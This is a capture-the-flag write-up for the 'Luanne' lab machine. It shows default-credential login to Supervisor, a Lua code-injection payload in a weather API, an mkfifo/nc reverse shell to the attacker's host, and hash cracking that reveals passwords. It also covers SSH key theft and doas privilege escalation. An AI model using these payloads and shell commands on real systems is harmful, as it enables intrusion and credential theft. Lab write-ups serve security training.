@@ -1,0 +1,257 @@
+Luanne
+
+ 24th March 2021 / Document No D21.100.111
+ Prepared By: bertolis
+ Machine Author: polarbearer
+ Difficulty: Easy
+ Classification: Official
+Synopsis
+
+Luanne is an easy difficulty NetBSD Linux machine. Network enumeration reveals a Medusa
+Supervisor Process Manager that is found to be using the default login credentials. Enumeration
+of a monitoring script that is accessible from the Supervisor Process Manager reveals a Lua script
+that is vulnerable to code injection. It is running in a custom weather web application on a
+bozohttpd server. A second misconfigured bozohttpd server that is found to be running in
+development mode, which is leveraged to obtain the private SSH key for the system user
+r.michaels . Using netpgp , we can decrypt an encrypted tar backup file that contains the
+password for the user r.michaels , who is found to be able to execute commands as root, using
+the command doas .
+
+Skills Required
+
+      Web Enumeration
+      Linux Enumeration
+
+Skills Learned
+
+      Lua Code Injection
+      NetPGP and doas Abuse
+Enumeration
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.218 | grep ^[0-9] | cut -d '/' -f
+   1 | tr '\n' ',' | sed s/,$//)
+   nmap -p$ports -sC -sV 10.10.10.218
+
+Nmap output reveals an SSH server and an Nginx server running on their default ports. A
+Medusa server is also running on port 9001. Navigating to both port 80 and port 9001 using a
+web browser returns an Authentication Required message. Default credentials such as admin
+/ admin or user / user do not appear to grant access on port 80.
+However, Nmap recognized the Medusa server as a Supervisor process manager . Searching
+online for Medusa supervisor process manager default credentials reveals the following as
+the first result.
+
+Scrolling down to page 14, we can see that the supervisord.conf file contains default
+credentials for Medusa HTTP server.
+
+Let's try to login on port 9001 using the credentials user / 123 .
+
+It seems that Supervisor is monitoring some services on the host, using which we can execute
+some commands and get further information. Clicking on the Tail -f Stdout action of the
+service processes , returns real-time results regarding some processes that are being monitored
+on the host.
+It is worth noting that two httpd processes are running, one on port 3001 and the other on port
+3000.
+The one running on port 3001 seems to be a development server, since it is running under the
+user r.michaels , the process id /var/run/httpd_devel.pid and the directory
+/home/r.michaels/devel/www .
+The second one running on port 3000, could be the production server running under the user
+_httpd and the directory /var/www . Further enumeration of the Nginx server on port 80
+reveals that it is used as a reverse proxy for the httpd server we just found running on port
+3000.
+
+   curl -v http://10.10.10.218
+
+Searching online for /usr/libexec/httpd server reveals the following as the first result.
+The History section reveals that this server is also called bozohttpd
+
+Searching online for bozohttpd manual reveals the following as the first result.
+
+Analyzing the command /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather
+/usr/local/webapi/weather.lua -U _httpd -b /var/www , we notice the option -L weather
+/usr/local/webapi/weather.lua . According to the manual we just found online, the option -L
+can add a new Lua script for a particular prefix.
+
+The above paragraph along with the command /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I
+3000 -L weather /usr/local/webapi/weather.lua -U _httpd -b /var/www , implies that there
+should be a directory called weather . In this case, it is the Lua script. There should also be a
+subdirectory which is the name of function that is registered to the Lua script, which is acting like
+an API.
+Let's scan the URL http://10.10.10.218/weather for subdirectories using FFuF.
+
+   ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u
+   http://10.10.10.218/weather/FUZZ
+FFuF reveals the sub directory forecast . Let's access the API using cURL.
+   curl -v http://10.10.10.218/weather/forecast
+
+The request to http://10.10.10.218/weather/forecast returned the above JSON data
+structure. Let's try to list the cities as the message indicates.
+
+   curl -v http://10.10.10.218/weather/forecast?city=list
+
+Then, we can try adding the city London.
+   curl -v http://10.10.10.218/weather/forecast?city=London
+The above request to the API returns the weather forecast for the city London.
+Foothold
+
+We notice that if we input a random string, such as test , the output is displayed back to the
+user as an error message.
+
+   curl -v http://10.10.10.218/weather/forecast?city=test
+
+Searching online for httpd Lua vulnerabilities reveals the following article as the first result.
+
+Scrolling down to the LUA CODE INJECTION , we can see some vulnerable examples for Nginx and
+CGI.
+Let's try one of these on the bozohttpd server and check if it works.
+   curl -v http://10.10.10.218/weather/forecast?city=curl -v
+   "http://10.10.10.218/weather/forecast?city=')+os.execute('id')+--"
+
+This is successful. We can now execute commands on the host as the user _httpd . Let's get a
+reverse shell using the following commands. First, we start a Netcat listener on our attacking
+machine on port 4444.
+
+   nc -lvp 4444
+Then we send the following request in order to acquire the reverse shell.
+
+   curl "http://10.10.10.218/weather/forecast?
+   city=')+os.execute('rm+/tmp/pbf;mkfifo+/tmp/pbf;cat+/tmp/pbf|/bin/sh+-
+   i+2>%261|nc+10.10.14.3+4444+>/tmp/pbf')+--"
+This is successful, and a reverse shell is returned.
+Lateral Movement
+
+Enumeration of the filesystem reveals the file /var/www/.htpasswd .
+   ls -la /var/www
+
+Listing the content of the file, we see the following hash for the user webapi_user .
+   cat /var/www/.htpasswd
+
+Let's store the hash into a file called hash and attempt to crack it using John The Ripper.
+   echo "webapi_user:\$1\$vVoNCsOl\$lMtBS6GL2upDbR4Owhzyc0" > hash
+   john --wordlist=/usr/share/wordlists/rockyou.txt hash
+
+John reveals the password iamthebest for the user webapi_user . We can verify that these are
+the credentials for the authentication that is required to access the web page on port 80.
+   curl --user "webapi_user:iamthebest" http://10.10.10.218
+
+Let's try to use the same credentials for the development server that is running on port 3001,
+since we have access to the host. On the remote machine, we run the following.
+
+   curl --user webapi_user:iamthebest localhost:3001
+
+This is successful. Let's try to perform the same code injection method as on the production
+server, so we can acquire a reverse shell as the user r.michaels .
+   curl "localhost:3001/weather/forecast?city=')+os.execute('id')+--"
+
+This was unsuccessful and the error message unknown city is returned. This means that the
+vulnerability has been patched on the development server. Looking back on how the httpd
+server is running, we notice that the flag -u is enabled. According to the bozohttpd manual we
+found earlier online, we see that this option makes the directory
+/home/r.michaels/public_html (if one exists), available in the URL
+http://localhost:3001/r.michaels .
+
+Also, since the -X option is enabled, directory listing will be possible, but only if there isn't any
+index.html file present.
+
+Let's try to access this directory, by issuing the following cURL command.
+   curl --user webapi_user:iamthebest localhost:3001/~r.michaels/
+
+This worked and the directory seems to contain the private key id_rsa . Let's copy this key locally
+and try to connect to the host as user r.michaels over SSH. First, issue the following cURL
+command to read the content of the file.
+
+   curl --user webapi_user:iamthebest localhost:3001/~r.michaels/id_rsa
+Then, store the key in a file and name it id_rsa , give the appropriate permissions and connect
+to the host using SSH.
+
+   chmod 600 id_rsa
+   ssh -i id_rsa r.michaels@10.10.10.218
+
+This is successful. The user flag is located in /home/r.michaels/user.txt .
+Privilege Escalation
+
+Enumeration of the home directory reveals the file devel_backup-2020-09-16.tar.gz.enc .
+Judging by the file extension, this might be an encrypted tar file. Further enumeration reveals
+the files /home/r.michaels/.gnupg/pubring.gpg and
+/home/r.michaels/.gnupg/secring.gpg . Searching online for gnupg reveals the following as
+the first result.
+
+According to the official website, GnuPG allows you to encrypt and sign your data and
+communications. The following paragraph also indicates that GnuPG/GPG is a command line tool.
+
+Typing gpg on the host system returns the error not found .
+   gpg
+
+Executing the command uname -a reveals that the host OS is NetBSD.
+Let's search online for the NetBSD implementation of the GnuPG.
+
+Google reveals the tool netpgp as the second result.
+
+As we can see from the manual page, we can encrypt and decrypt files using netpgp . The
+following paragraph also describes that a set of public/private keys can be used for the
+encryption/decryption as well.
+It is very likely that the two files we found earlier in the directory /home/r.michaels/.gnupg/ ,
+have been used for encrypting the tar file we also found in the /home/r.michaels/backups/
+directory. Let's try to decrypt the tar file by issuing the following command.
+
+   cd /home/r.michaels/backups
+   netpgp --decrypt --output=devel_backup-2020-09-16.tar.gz devel_backup-2020-09-
+   16.tar.gz.enc
+
+It seems that we are not allowed to write in the home directory. We can confirm by executing the
+following command.
+
+   ls -l /home/r.michaels
+
+Let's copy the tar file into the /tmp directory and try again.
+   cp /home/r.michaels/backups/devel_backup-2020-09-16.tar.gz.enc /tmp
+   cd /tmp
+   netpgp --decrypt --output=devel_backup-2020-09-16.tar.gz devel_backup-2020-09-
+   16.tar.gz.enc
+The decryption was successful. The netpgp tool appears to automatically use the keys that were
+stored in the directory /home/r.michaels/.gnupg/ . Finally, let's decompress the tar file we just
+decrypted.
+
+   tar xvzf devel_backup-2020-09-16.tar.gz
+
+Enumeration of the file /tmp/devel-2020-09-16/www/.htpasswd , reveals the hash
+$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu. for the user webapi_user .
+
+Let's crack it using John and check if the password is different from the one we found earlier for
+the same user. First, we have to add the hash into a file and name it hash . To do so, we execute
+the following commands locally.
+
+   echo "webapi_user:\$1\$6xc7I/LW\$WuSQCS6n3yXsjPMSmwHDu." > hash
+Then, we run john .
+
+   john --wordlist=/usr/share/wordlists/rockyou.txt hash
+This is successful. The password littlebear is revealed for the user webapi_user . Let's further
+enumerate the system, by uploading LinPEAS script. First, we download it locally.
+
+   wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-
+   scripts-suite/master/linPEAS/linpeas.sh
+
+Next, we upload it to the remote machine, using scp , and the id_rsa file we copied earlier.
+   scp -i id_rsa linpeas.sh r.michaels@10.10.10.218:/tmp/linpeas.sh
+
+Finally, on the host, we give the file execution permissions and run it.
+   chmod +x linpeas.sh
+   sh linpeas.sh -a
+
+LinPEAS reveals that the doas.conf file, contains the configuration permit r.mechaels as
+root . Searching online for doas privilege escalation reveals the following as the first result.
+Scrolling down the page, we can see that the doas command is the sudo alternative for the
+OpenBSD OS.
+
+That means the we can execute commands in the context of root, as long as we know the
+password. According to the doas help menu, we can see that commands can be passed at the
+end as arguments.
+
+   doas
+
+Let's run the following command in order to get shell as user root, providing the password
+littlebear we found earlier.
+
+   doas sh
+
+The root flag is located in /root/root.txt .
+
